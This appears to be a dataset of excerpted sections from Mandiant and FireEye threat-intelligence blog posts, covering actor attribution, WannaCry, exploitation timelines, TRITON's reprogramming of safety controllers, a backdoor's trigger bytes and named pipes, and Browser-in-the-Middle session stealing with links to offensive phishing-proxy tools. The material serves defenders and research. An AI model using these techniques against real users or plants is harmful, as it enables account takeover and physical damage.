disclosure, and early indications show that tooling and infrastructure overlap with past intrusions attributed to suspected China-based espionage actors. Additionally, Linux-based tools identified in \nCutting Edge, Part 2: Investigating Ivanti Connect Secure VPN Zero-Day Exploitatio incident response investigations use code from multiple Chinese-language Github repositories. As noted in our previous blog post, UNC5221 has largely leveraged TTPs associated with zero-day exploitation of edge infrastructure by suspected PRC nexus actors. ", "source": "mandiant"}, {"title": "Targeting", "content": "Mandiant identified UNC4899 targeting MacOS keychains and reconnaissance data associated with executives and internal security teams. \nUNC4899 targeting overlaps with a separate RGBaligned group, APT43, who in July, 2023 displayed interest in the cryptocurrency vertical, specifically targeting a variety of C-Suite executives from multiple fintech and cryptocurrency companies in the United States, South Korea, Hong Kong, and Singapore. Many of the individuals work at organizations related to financial services, cryptocurrency, blockchain, web3 and related entities. The overlaps in targeting and sharing of infrastructure amongst DPRK groups highlights the continued targeting and coordinated interest in the cryptocurrency field. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant is tracking this activity as UNC4899, a suspected North Korean actor. We assess with high confidence that UNC4899 is a cryptocurrencyfocused group that falls under the RGB. UNC4899's targeting is selective, and they have been observed gaining access to victim networks through JumpCloud. Mandiant has observed overlap amongst multiple North Korean groups that fall under the RGB. These groups commonly share infrastructure to complete their actions on objectives. Mandiant has observed UNC2970, APT43, and UNC4899 all utilize similar infrastructure \nMandiant has observed an increase in financially motivated operations by DPRK actors in the past year, particularly those focused on the cryptocurrency industry. RGB-aligned cryptofocused groups, publicly reported under the umbrella term Lazarus, and clear variants of historic, established APT threat actors such as the open source \"TraderTraitor\" and \"AppleJeus\", have increasingly conducted financially motivated \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog operations that have affected the cryptocurrency industry and various blockchain platforms. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Use of botnets, proxying traffic in a compromised network, and targeting edge devices are not new tactics, nor are they unique to Chinese cyber espionage actors. However, during the last decade, we have tracked Chinese cyber espionage actors' use of these and other tactics as part of a broader evolution toward more purposeful, stealthy, and effective operations. We suggest that the military and intelligence restructure, evidence of shared development and logistics infrastructure, and legal and institutional structures directing vulnerability research through government authorities point to long term investments in equipping Chinese cyber operators with more sophisticated tactics, tools, and exploits to achieve higher success rates in gaining and maintaining access to high value networks. The examples highlighted here indicate that these investments are bearing fruit. ", "source": "mandiant"}, {"title": "Attribution", "content": "At this time, multiple potential attribution scenarios for the WannaCry activity are viable. We are continuing to investigate all potential attribution scenarios. \nFinancially-motivated cyber criminals are typically responsible for ransomware operations, with many such actors operating independently worldwide; however, as of yet, none of these actors have been identified as a strong candidate for attributing the WannaCry operation. \nSome aspects of the WannaCry operation suggest the operators may not be highly sophisticated and may not have anticipated the malware would spread as widely as it has. One of these aspects is the aforementioned killswitch functionality. \nSophisticated malware developers experienced with combatting security countermeasures might have anticipated this functionality would constitute a threat to the malware's success. Another aspect is that identified ransom payments have been reported to be relatively low thus far, suggesting the operators' payment system may not have been equipped to handle the outcome of worldwide infections. \nNumerous open-source reports allege potential North Korean involvement in this campaign. Based on FireEye's initial analysis, the code similarities cited between allegedly North Korea-linked malware and WannaCry constitute a potential lead worth further investigation, but are not unique enough independent of other evidence to be clearly indicative of common operators. \nSee the bottom of the post for a list of related MD5s, URLs, Tor sites, executables, registry keys, files created, file strings, processes started, and SNORT signatures. \nThe following is the blog as originally published on May 15. \nSince May 12, 2017, a highly prolific WannaCry ransomware campaign has been observed impacting organizations globally. WannaCry (aka WCry or WanaCryptor) malware is self-propagating (worm-like) ransomware that spreads through internal networks and over the public internet by exploiting a vulnerability in Microsoft Server Message Block (SMB) protocol. The malware appends encrypted data files with the .WCRY \nextension, drops and executes a decryptor tool, and demands $\\$300$ or $\\$600$ USD (via Bitcoin) to decrypt the data. The malware uses encrypted Tor channels for command and control (C2) communications. \nBased on our analysis, malicious binaries associated with WannaCry activity are comprised of two distinct components, one that provides ransomware functionality \u2013 acting very similar to WannaCry malware samples reported before May 12 \u2013 and a component used for propagation, which contains functionality to enable the discussed scanning and SMB exploitation capabilities. \nGiven the rapid and prolific distribution of this ransomware, FireEye iSIGHT Intelligence considers this activity to pose a significant risk to all organizations using potentially vulnerable Windows machines. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Now that you've seen all the recent improvements to capa, we hope you'll upgrade to the newest capa version right away! Thanks to library function identification capa will report faster and more relevant results. Hundreds of new rules capture the most interesting malware functionality while the improved capa explorer plugin helps you to focus your analysis and codify your malware knowledge while it's fresh. \nStandalone binaries for Windows, Mac, and Linux are available on the capa Releases page. To install capa from PyPi use the command pip install flarecapa. The source code is available at our capa GitHub page. The project page on GitHub contains detailed documentation, including thorough installation instructions and a walkthrough of capa explorer. Please use GitHub to ask questions, discuss ideas, and submit issues. \nWe highly encourage you to contribute to capa's rule corpus. The improved IDA Pro plugin makes it easier than ever before. If you have any issues or ideas related to rules, please let us know on the \nGitHub repository. Remember, when you share a rule with the community, you scale your impact across hundreds of reverse engineers in dozens of organizations. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Attribution", "content": "At the time of publication, Mandiant had not linked this activity to a previously known group, nor do we currently have enough data to assess the origin of this threat actor. UNC5221 was created to track this suspected espionage actor. The targeting of edge infrastructure with zero-day vulnerabilities has been a consistent tactic leveraged by espionage actors to enable their operations. Additionally, Mandiant has previously observed multiple suspected APT actors utilizing appliance specific malware to enable postexploitation and evade detection. These instances, combined with Volexity's findings around targeting, leads Mandiant to suspect this is an espionagemotivated APT campaign. \nUNC5221 primarily used compromised out-ofsupport Cyberoam VPN appliances for C2. These compromised devices were domestic to the victims, which likely helped the threat actor to better evade detection. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we explored deserialization vulnerabilities and developed a process and tools to rapidly prototype detections for in-the-wild exploitation. Although this type of bug has been around for years, Mandiant continues to observe threat actors, including advanced groups like APT41, using publicly disclosed exploit \"chains\" in their intrusions. \nOur tool, HeySerial.py, is intended to be an extensible framework that can be expanded to \nNow You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits | Google Cloud Blo support additional object types, encoding methods, and rule formats. To find out more, check out our Developer Guide. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As shown in our recent post, hypervisor level compromises afford threat actors with many opportunities for rapidly and stealthily exploiting hosted systems and applications. In this blog post, we discussed how one such method, Azure Run Command, is being leveraged by attackers and how defenders can hunt for, detect, and mitigate malicious usage of it. \nHypervisor compromises yield a high level of access to hosted systems and data, which are commonly an attacker's primary objective in an intrusion. This evolution of intrusion methodology requires a thorough understanding of built-in cloud asset management functionality that can be abused by attackers. More importantly, this activity reinforces the need for comprehensive visibility and a vigilance for anomalous activity within environments. ", "source": "mandiant"}, {"title": "Timeline", "content": "Time-to-Exploit \nTime-to-exploit (TTE) is our metric for defining the average time taken to exploit a vulnerability before or after a patch is released. Historically, our analyses have seen reduced times-to-exploit year over year. Through 2018 to 2019, we observed an average TTE of 63 days. From 2020 to the start of 2021, that number decreased to 44 days. Then, across all of 2021 and 2022, the average observed TTE dropped further to 32 days, already half of our first tracked TTE starting in 2018. In 2023, we observed the largest drop in TTE thus far, with an average of just five days. This is less than a sixth of the previously observed TTE. \nOur average TTE excludes 15 total data points, including two n-days and 13 zero-days, that we identified as outliers from a standard deviationbased statistical analysis. Without the removal of these outlier TTEs, the average grows from five to 47. ", "source": "mandiant"}, {"title": "Timeline", "content": "Of the analyzed vulnerabilities, 41 $30\\%$ were first exploited after the vulnerability's public disclosure. This section will focus on this subset of vulnerabilities. While we have pursued analysis of associations between exploit availability and exploitation timelines, Mandiant has continued not to observe a correlation between the two. It may be common to assume a relationship between the two data points; however, our longer-term analysis shows a distinct lack of association. \nFor vulnerabilities with exploits available prior to exploitation, we observed a median of 7 days from the date of disclosure (DoD) to the first public exploit release, and a median of 30 days from the exploit's release date to the date of first known exploitation. The median time from disclosure to exploitation of these vulnerabilities was 43 days. \nFor vulnerabilities with exploits first made available after exploitation, we observed a median time of 15 days from disclosure to exploitation. The median time from exploitation to a publicly available exploit was observed to be four days, with a median timeline from disclosure to exploit release being observed as 23 days. \nThese statistics are consistent with our past analyses, which have expressed non-deterministic outcomes regarding the influence of existing exploits on in-the-wild exploitation. We continue to find this true while also noting that there are other factors that affect the exploitation timeline of a given vulnerability. Potential factors include, but are not limited to, exploitation value and exploitation difficulty. To highlight one of these factors, we note that of the vulnerabilities disclosed in 2023 that received media coverage, $58\\%$ are not known to be exploited in the wild, and for those with at least one public proof of concept (PoC) or exploit, $72\\%$ are not known to be exploited in the wild. The following are two specific examples we observed that demonstrate the variance in how much of an effect an exploit's release can have on the time to in-thewild exploitation, and that illustrate other potential influences in exploitation. ", "source": "mandiant"}, {"title": "Targeting", "content": "Brazil's status as a globally influential power and the largest economy in South America have drawn attention from cyber espionage actors for several years, including targeting by government-backed groups from the People's Republic of China (PRC), Russia, and North Korea. \nSince 2020, cyber espionage groups from more than a dozen countries have targeted users in Brazil; however, more than $85\\%$ of government-backed phishing activity is \nconcentrated among groups from the PRC, North Korea, and Russia. The Brazil-focused targeting of these groups mirrors the broader priorities and industry targeting trends we see elsewhere. North Korean government-backed groups, for example, have shown a keen interest in Brazilian cryptocurrency firms, aerospace and defense, and government targets. PRC groups, meanwhile, have targeted Brazilian government organizations, as well as the energy sector. Russian cyber espionage groups have targeted users in Brazil regularly dating back more than a decade; however since the start of Russia's war in Ukraine, Russian activity targeting Brazil has scaled back considerably - likely an indication of Russia's efforts to focus resources on Ukrainian and NATO targets in the context of the Russia-Ukraine war. \nThe examples here highlight recent and historical examples where cyber espionage actors have targeted users and organizations in Brazil. It should be noted that these campaigns describe targeting and do not indicate successful compromise or exploitation. ", "source": "mandiant"}, {"title": "Targeting", "content": "Cyber espionage activity linked to the People's Republic of China (PRC) targeting Brazil dates back more than a decade. Since 2020, we have observed 15 PRC cyber espionage groups targeting users in \nBrazil, and these groups have accounted for over $40\\%$ of government-backed phishing activity targeting Brazil. As the largest recipient of Chinese investment in Latin America, this volume of PRC cyber espionage is reminiscent of activity in other regions where Chinese government investment has been focused, such as countries within China's Belt and Road Initiative. In addition to activity targeting Gmail users, PRC groups have targeted Brazil's military, national government, diplomatic organizations, and the provincial governments of multiple Brazilian states. These groups have targeted users in Brazil using tactics ranging from phishing to malware distribution and exploitation of known vulnerabilities. \nIn August 2023, for example, Google detected a campaign from a PRC group that targeted nearly two hundred users in a Brazilian executive branch organization. The phishing emails contained links to an encrypted ZIP archive hosted on a known phishing domain. Organizations in Brazil's state governments have also been a target. In late 2022, PRC actors used an operational relay box (ORB) network to anonymize their activity and attempted to send a mass phishing campaign to nearly two thousand email addresses, including 70 email addresses in the .br ccTLD, the majority of which belonged to Brazilian state government organizations. The mass email, which Gmail blocked, contained a malicious TAR attachment designed to exploit CVE-2022-41352, an n-day vulnerability in the Zimbra Collaboration Suite that enables an attacker to upload arbitrary files and gain unauthorized access to other user accounts. The \ncampaign targeted organizations globally and appeared opportunistic - most of the targeted email addresses were addressed to the domain admin (e.g., admin@[domain].gov.br). \nPRC cyber espionage activity against local and provincial entities is of note in light of campaigns by threat actors such as UNC4841 that have focused on similar targets globally, including in Brazil. As part of their exploitation of the Barracuda Email Security Gateway in 2023, UNC4841 targeted a Brazilian business association focused on promoting statelevel commerce across several industries. \nPhishing pages created by PRC cyber espionage groups targeting Brazil's government ", "source": "mandiant"}, {"title": "Targeting", "content": "Since 2020, North Korean cyber actors have accounted for approximately a third of governmentbacked phishing activity targeting Brazil. North Korean government-backed actors have targeted the Brazilian government and Brazil's aerospace, technology, and financial services sectors. Similar to \nInsights on Cyber Threats Targeting Users and Enterprises in Brazil | Google Cloud Blo their targeting interests in other regions, cryptocurrency and financial technology firms have been a particular focus, and at least three North Korean groups have targeted Brazilian cryptocurrency and fintech companies. \nIn early 2024, PUKCHONG (UNC4899) targeted cryptocurrency professionals in multiple regions, including Brazil, using a Python app that was trojanized with malware. To deliver the malicious app, PUKCHONG reached out to targets via social media and sent a benign PDF containing a job description for an alleged job opportunity at a well known cryptocurrency firm. If the target replied with interest, PUKCHONG sent a second benign PDF with a skills questionnaire and instructions for completing a coding test. The instructions directed users to download and run a project hosted on GitHub. The project was a trojanized Python app for retrieving cryptocurrency prices that was modified to reach out to an attacker-controlled domain to retrieve a second stage payload if specific conditions were met. ", "source": "mandiant"}, {"title": "Targeting", "content": "We have observed Latin American-based threat actors leverage and target country-specific payment platforms, either to facilitate sales of services or to target payment information from victims. In the case of Brazil, such activity has focused on Pix, an instant payment platform created and managed by the Brazilian Central Bank. Pix \nenables instant payments and transfers between bank accounts within seconds using a key, and it is one of the most common methods of payment in Brazil. \nOpen source reporting indicates threat actors as recently as late 2023 were involved in distributing malware called \"GoPix\" to specifically targeted Pix users via malicious advertisement techniques or \"malvertising.\" The reported functionality of this malware includes the ability to hijack clipboard functionality for Pix or cryptocurrency transactions, replacing the Pix string or wallet address with one controlled by the attacker. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As Brazil continues to grow in economic and geopolitical significance, it will remain an attractive target for threat actors driven by diverse motivations. The country's digital landscape is a complex arena, developed and expanded over the years by a convergence of both global and local threats. Global cyber espionage actors from North Korea, the People's Republic of China (PRC), and Russia as well as multinational cybercriminals pose longstanding threats, and Brazil's domestic cybercriminal market remains a persistent \nchallenge\u2013increasing the complexities of this dynamic landscape.To effectively safeguard Brazilian enterprises and users, it is important to understand this unique interplay of threats and adopt a proactive approach to cybersecurity. \nWe hope the analysis and research here helps to inform defenders in Brazil, providing fresh insights for collective defense. At Google, we are committed to supporting the safety and security of online users everywhere and will continue to take action to disrupt malicious activity to protect our users and help make the Internet safe for all. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The malware authors responsible for Hancitor have developed several capabilities within malicious macros that support malware installation and data theft. These capabilities include leveraging uncommon APIs and obscuring malicious PowerShell commands, tactics that made detection more challenging. \nFireEye Exploit Guard provides organizations with the ability to detect malicious shellcode in the initial phase of the attack lifecycle, regardless of these evasion techniques. \nFireEye recommends that organizations block macros in Microsoft Office documents that originate from the Internet by Group Policy. In all cases, users should be cautious about enabling macros and should practice vigilance about opening email messages from untrusted sources. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Summary", "content": "The TCP LOWKEY variant passively listens for the byte sequence FF FF 01 00 00 01 00 00 00 00 00 00 on TCP port 53 to be activated. The backdoor then uses up to three named pipes for communication. One pipe is used for the main communication of the backdoor, the other ones are used on demand for the embedded payloads. \n\\\\.\\pipe\\Microsoft Ole Object {30000-7100- 12985-00001-00001} main communication pipe \\\\.\\pipe\\Microsoft Ole Object {30000-7100- 12985-00000-00001} named pipe used for interaction with the TCP relay module ProcTran.dll \\\\.\\pipe\\Microsoft Ole Object {30000-7100- 12985-00000-00000} named pipe used for the interactive shell module UserFunction.dll \nFigure 8 summarizes how the LOWKEY components interact with each other. ", "source": "mandiant"}, {"title": "Summary", "content": "In this blog post we have introduced the FLARE team's newest contribution to the malware analysis community. FLOSS is an open-source tool to automatically detect, extract, and decode obfuscated strings in Windows Portable Executable files. The community needs this type of tool to fight back against malware authors who commonly obfuscate strings in their programs to deter static and dynamic analysis. In addition to extracting \nstrings that are deobfuscated by decoding routines, FLOSS can recover stackstrings and obtain all static strings. \nTry out FLOSS in your next malware analysis. The tool is extremely easy to use and can provide valuable information for forensic analysts, incident responders, and reverse engineers. If you enjoy the tool, run into issues using it, or have any other comments, please contact us via the projects GitHub page at https://github.com/fireeye/flarefloss/. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "We hope that you enjoyed getting to know and learning about the experiences of our 2023 GSoC contributors. Each contributor collaborated with their FLARE mentors to write a blog post that covers their project in greater detail. Keep an eye out as we release these posts in the upcoming weeks. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Using shellcode as the final stage for payloads during assessments allows Red Teams the flexibility to execute payloads in a wide array of environments while implementing techniques to avoid detection. The DueDLLigence shellcode runner is a dynamic tool that takes advantage of the evasive properties of both shellcode and process injection to offer Red Teams a way to avoid detection. Detections for the execution of LOLbins on the command line and process injection at the API and process level should be incorporated into defensive methodology, as attackers are increasingly being forced into living off the land with the increased adoption of application whitelisting. ", "source": "mandiant"}, {"title": "Targeting", "content": "Throughout 2022, the majority of hacktivist claims that Mandiant observed targeting OT followed similar techniques, tactics and procedures (TTPs) and behavioral patterns. The actors often leveraged similar social media and messaging channels and targeted victims in the same way. \nMost often, the hacktivists likely gained initial access via insecure, internet accessible devices or publicfacing applications. This allowed them to execute actions via command-line, or graphical user interfaces (See the Appendix for a list of MITRE ATT&CK for ICS tactics and techniques used by hacktivists targeting OT). While these types of techniques have historically been used to conduct low sophistication OT compromises, we recently observed some unique trends that indicate changes from baseline activity. ", "source": "mandiant"}, {"title": "Targeting", "content": "Red team operators can target these session tokens using a variety of tools and techniques. The most common tool is Evilginx2, a transparent proxy where a red team operator's server acts as an intermediary between the victim and the targeted service. Any HTTP requests made by the victim are captured by the phishing server and then forwarded directly to the intended website. However, before returning the responses to the victim, the server subtly modifies them by replacing any references to the legitimate domain with the phishing domain. This manipulation allows operators to not only capture the victim's login credentials from POST requests but also to extract session cookies (tokens) from the server's response headers after the victim has completed authentication and MFA prompts. \nDuring a red team engagement, a consultant working within a constrained time frame is tasked with achieving a series of objectives that cover a broad spectrum, such as retrieving sensitive employee data (e.g., personally identifiable \nBitM Up! Session Stealing in Seconds Using the Browser-in-the-Middle Technique | Google Cloud Blog information [PII]) or even a complete takeover of the target's Active Directory infrastructure. The red team's mission is to simulate a real-world attack and evaluate the effectiveness of the client's security measures by exploiting vulnerabilities and employing various techniques to gain unauthorized access. It is rare for a consultant to deploy a transparent proxy targeting a custom application unique to a client due to the high degree of customization that can be involved during setup. \nTransparent proxies require significant customization and configuration to work against a targeted application. This process can be timeconsuming, complex, and error-prone, especially for a red team operator targeting multiple applications. Often the operator will have to fully understand the way the application handles sessions and authentication before being able to successfully target the application. Once an application has been fully reduced to a template that is usable with the chosen transparent proxy, red team operators will still need to keep the templates up to date introducing a large amount of overhead. ", "source": "mandiant"}, {"title": "Targeting", "content": "According to MITRE, Browser in the Middle (BitM) \"uses the inherent functionalities of a web browser to convince the victim they are browsing normally https://cloud.google.com/blog/topics/threat-intelligence/session-stealing-browser-in-the-middle \nBitM Up! Session Stealing in Seconds Using the Browser-in-the-Middle Technique | Google Cloud Blog under the assumption that the connection is secure. All the actions performed by the victim in the open window are actually performed on the machine of the adversary.\" In short, this attack is similar to a victim sitting in front of an attacker's computer and signing in for them; all of the data required to authenticate to the application is now under the attacker's control. \nBitM offers a number of advantages for red team operators when compared to traditional methods of stealing authenticated session tokens. A pivotal benefit of employing a BitM framework lies in its rapid targeting capability, allowing it to reach any website on the web in a matter of seconds and with minimal configuration. Once an application is targeted through a BitM tool or framework, the legitimate site is served through an attackercontrolled browser. This makes the distinction between a legitimate and a fake site exceptionally challenging for a victim. From the perspective of an adversary, BitM allows for a simple yet effective means of stealing sessions protected by MFA. ", "source": "mandiant"}, {"title": "Overview", "content": "Mandiant has developed an internal tool (Delusion) for performing BitM attacks, enabling an operator to target a specific application without possessing prior knowledge about the authentication protocols employed by the application. \nDelusion includes a number of unique features that enable session-stealing attacks at scale: \nSupport for storing and downloading Firefox browser profiles, making session stealing trivial, no cookie import required   \nA monitor page where an operator can interact with a victim's session in real time   \nThe ability to scale containers and automatically add them to a load balancer for large-scale phishing campaigns   \nTwo modes of operation designed for either vishing or phishing (Manual and Automatic)   \nBookmarks to simplifying deploying against multiple websites   \nTagging for campaign management   \nSession recording for reporting purposes \nDelusion was inspired by the following blog posts and research papers. Development would not have been possible without their commitment to publishing and releasing research. \nBitM Up! Session Stealing in Seconds Using the Browser-in-the-Middle Technique | Google Cloud Blog https://mrd0x.com/bypass-2fa-using-novnc/ https://link.springer.com/article/10.1007/s10207- 021-00548-5 https://fhlipzero.io/blogs/6_noVNC/noVNC.html \nMandiant has chosen not to publish Delusion due to weaponization concerns. If you are interested in how your application or portal performs against BitM and other session-stealing threats, check out these open source projects: \nhttps://github.com/JoelGMSec/EvilnoVNC https://github.com/fkasler/cuddlephish https://github.com/kgretzky/evilginx2 ", "source": "mandiant"}, {"title": "Conclusion", "content": "The threat of BitM attacks emphasizes the importance of robust authentication and accesscontrol mechanisms. By adopting a multi-layered defense strategy incorporating client certificates, hardware-based MFA solutions such as FIDO2- compatible security keys, and compensating controls, organizations can significantly enhance their resilience against these sophisticated threats. The integration of security keys into this defense strategy provides a particularly effective safeguard against session stealing, offering users a tangible and reliable way to protect their online identities and sensitive data. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The ease and breadth of exploitation in which UNC1945 conducted this campaign suggests a sophisticated, persistent actor comfortable exploiting various operating systems, and access to resources and numerous toolsets. Given the aforementioned factors, use of zero-day exploits and virtual machines, and ability to traverse multiple third-party networks, Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility. ", "source": "mandiant"}, {"title": "Targeting", "content": "Proofpoint initially reported on a widespread campaign targeting banks and financial organizations throughout the U.S. and Middle East in early 2016. We identified several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same attackers. \nThis cluster of activity persisted from late 2014 into early 2016. Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar financial entities in these regions. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data-stealing malware. Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows: \n1. Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s). \n2. Some of the operators may be compiling their own builds of the backdoor independently. \n3. A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary's strings with a fresh key for each build. \n4. Varying campaign codes indicate that independent or loosely affiliated criminal actors are employing CARBANAK in a wide-range of intrusions that target a variety of industries but are especially directed at financial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "There are many attack paths and vectors that veteran red teams can use to bypass \"secure\" security controls. At Mandiant, our Red Team takes advantage of our front line intelligence, as well as the latest tools, tactics, and procedures we see our adversaries leverage in their own breaches. \nUnfortunately, many companies place too much trust in security solutions such as two-factor authentication without taking the necessary steps to secure the underlying technologies. This oversight could allow attackers and red teams alike to subvert two-factor authentication implementations even when they're implemented properly. \nSpecial thanks to Andrew Burkhardt, Evan Pe\u00f1a, and Justin Prosco for their help with the content of this blog. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In a digital world where every click leaves a trace, the line between data analytics tooling around marketing demographics and malware attack campaign optimization has become dangerously blurred to some degree. As the capabilities of legitimate tooling increases, so too will the capabilities of threat actors who choose to use them for nefarious purposes. However, as we have demonstrated through the practical examples shown throughout this blog post, by demonstrating how attackers use these tools and providing insights on ways defenders can proactively take steps to mitigate or eliminate their effects, mounting a viable and impactful defense against them is achievable. ", "source": "mandiant"}, {"title": "Summary", "content": "Mandiant assesses with high confidence that UNC1151 is linked to the Belarusian government and with moderate confidence is linked to the Belarusian military. This is based on the below factors: \nThe countries targeted by the majority of UNC1151 operations have strained bilateral relationships with Belarus. While some of these countries are consistent targets of Russian cyber espionage, the specific mix supports a Belarusian nexus.   \nMinistries of Defense are the most common government entities targeted by UNC1151, suggesting a military intelligence focus for the group.   \nIndividual targets, including individuals who are part of the Belarusian opposition and media are of most interest to Belarus.   \nSensitive technical information locates the operation in Minsk, Belarus and links it to the Belarusian Military.   \nUNC1151 has conducted operations without a clear, direct link to Belarusian priorities. However, these are a minority of operations and are plausibly explained by multiple factors. \nMandiant assesses with high confidence that Ghostwriter information operations are conducted in support of the Belarusian government and with moderate confidence that they are conducted with Belarusian sponsorship. \nThe operations conducted since the disputed Belarusian elections in 2020 have conformed to \nspecific parochial Belarusian government goals and align with the overt actions taken by Belarus against Lithuania and Poland.   \nThe close technical links between UNC1151 and the Ghostwriter campaign suggest a high likelihood of a shared sponsor.   \nHowever, we lack insight into the generation of the information operations' content. \nMandiant has examined the possibility of Russian participation in UNC1151 and Ghostwriter operations, but we do not have sufficient evidence to confirm or refute a role in these activities. Mandiant has seen high level TTP overlaps with Russian operations and much of the targeting and information operations are consistent with Russian goals. Given the close ties between the governments, collaboration is plausible; however, we have not uncovered direct evidence of Russian government involvement. \nUNC1151's initial focus on NATO's reputation in the Baltics is also a goal of Russia. However, the operations focuses in Lithuania and Latvia, which border Belarus, and were not uncovered in Estonia, which does not.   \nRussia has significant offensive cyber and information operations expertise that could have supported the operation. ", "source": "mandiant"}, {"title": "Conclusion", "content": "flare-qdb provides a command-line tool to quickly query dynamic binary state without derailing the thought process of an ongoing debugging session. In addition to querying state, flare-qdb can be used to alter program state and simulate new scenarios. For intricate cases, flare-qdb has a scripting interface permitting almost arbitrary manipulation. This can be useful for string decoding, malware unpacking, and general software analysis. Head over to the flare-qdb github page to get started using it. ", "source": "mandiant"}, {"title": "Conclusion", "content": "FireEye believes that the actor behind NOTROBIN has been opportunistically compromising NetScaler devices, possibly to prepare for an upcoming campaign. They remove other known malware, potentially to avoid detection by administrators that check into their devices after reading Citrix security bulletin CTX267027. NOTROBIN mitigates CVE-2019- 19781 on compromised devices but retains a backdoor for an actor with a secret key. While we haven't seen the actor return, we're skeptical that ", "source": "mandiant"}, {"title": "Summary", "content": "The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message. \nWe assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons: \nModifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences.   \nTRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check.   \nThe failure occurred during the time period when TRITON was used.   \nIt is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident. ", "source": "mandiant"}, {"title": "Attribution", "content": "FireEye has not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker's persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor. Specifically, the following facts support this assessment: \nThe attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups. \nThe attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol. \nThe targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency. ", "source": "mandiant"}, {"title": "Background", "content": "Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as Industrial Control Systems (ICS) or Operational Technology (OT). \nA Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment. \nA SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations. \nAsset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts. ", "source": "mandiant"}, {"title": "Summary", "content": "The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON's extensive reconnaissance capabilities). \nThe TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks. ", "source": "mandiant"}, {"title": "Introduction", "content": "Remote Desktop Protocol (RDP) is a legitimate Windows service that has been well researched by the security community. However, most of the security community's existing research is focused on the adversarial use of RDP to control victim machines via interactive sessions. \nThis campaign included use of RDP that was not focused on interactive control of victim machines. Instead, adversaries leveraged two lesser-known features of the RDP protocol to present an \napplication (the nature of which is currently unknown) and access victim resources. Given the low prevalence of this tactic, technique, and procedure (TTP) in previous reporting, we seek to explore the technical intricacies of adversary tradecraft abusing the following functionality of RDP: \nRDP Property Files (.rdp configuration files)   \nResource redirection (e.g. mapping victim file systems to the RDP server)   \nRemoteApps (i.e. displaying server-hosted applications to victim) \nAdditionally, we will shed light on PyRDP, an opensource RDP proxy tool that offers attractive automation capabilities to attacks of this nature. \nBy examining the intricacies of the tradecraft observed, we gain not only a better understanding of existing campaigns that have 